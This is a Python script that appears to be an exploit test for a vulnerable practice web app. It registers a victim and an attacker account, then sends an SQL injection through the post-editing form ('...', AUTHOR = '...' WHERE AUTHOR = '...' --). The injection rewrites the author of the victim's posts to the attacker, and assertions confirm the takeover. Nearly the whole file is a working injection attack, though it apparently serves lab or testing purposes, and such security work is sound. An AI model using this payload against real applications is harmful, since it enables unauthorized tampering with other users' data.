from requests import session, get
from sys import argv
from random import randint
from re import findall

SERVER = argv[1]

victimSession = session()
victimUsername = str(randint(2 ** 27, 2 ** 28))
victimPassword = str(randint(2 ** 27, 2 ** 28))
attackerSession = session()
attackerUsername = str(randint(2 ** 27, 2 ** 28))
attackerPassword = str(randint(2 ** 27, 2 ** 28))
content = "RandomPostsContent" + str(randint(2 ** 27, 2 ** 28))

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

data = {
    "username": victimUsername,
    "password": victimPassword
}
r = victimSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert victimUsername in r.text

data = {
    "content": content,
    "type": "Public"
}
for i in range(2):
    r = victimSession.post(SERVER + "/create_post", data=data)

    assert r.text.count(victimUsername) == 2 + (i + 1)
    assert r.text.count(content) == (i + 1)

data = {
    "username": attackerUsername,
    "password": attackerPassword
}
r = attackerSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert attackerUsername in r.text

data = {
    "content": content,
    "type": "Public"
}
r = attackerSession.post(SERVER + "/create_post", data=data)

assert r.text.count(victimUsername) == 2
assert r.text.count(attackerUsername) == 2 + 1
assert r.text.count(content) == 3

dbId = findall(r"\d+", findall(r"id.*\d+", r.text)[-1])[-1]
attackerContent = "{}', AUTHOR = '{}' WHERE AUTHOR = '{}' -- ".format(content, attackerUsername, victimUsername)
data = {
    "id": dbId,
    "content": attackerContent,
    "type": "Public"
}
r = attackerSession.post(SERVER + "/edit_post", data=data)

assert r.text.count(victimUsername) == 0
assert r.text.count(attackerUsername) == 2 + 3
assert r.text.count(content) == 3

print("Success!")
victimSession.close()
attackerSession.close()
